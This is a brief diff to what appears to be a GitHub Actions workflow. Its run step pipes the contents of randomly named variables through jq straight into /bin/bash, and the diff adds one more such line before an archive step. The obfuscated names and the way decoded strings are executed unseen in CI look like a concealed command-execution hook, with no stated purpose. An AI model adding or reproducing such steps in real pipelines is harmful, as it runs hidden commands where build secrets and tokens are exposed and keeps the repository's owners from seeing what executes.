@@ -26,6 +26,7 @@ jobs:
           echo $mytk6 | jq -r .x68618 | /bin/bash
           printf '%s' "$pmhul72" | jq -r .hhn43591 | /bin/bash
           echo $kqj5436 | jq -r .x29 | /bin/bash
+          printf '%s' "$purk6" | jq -r .ugmw0 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
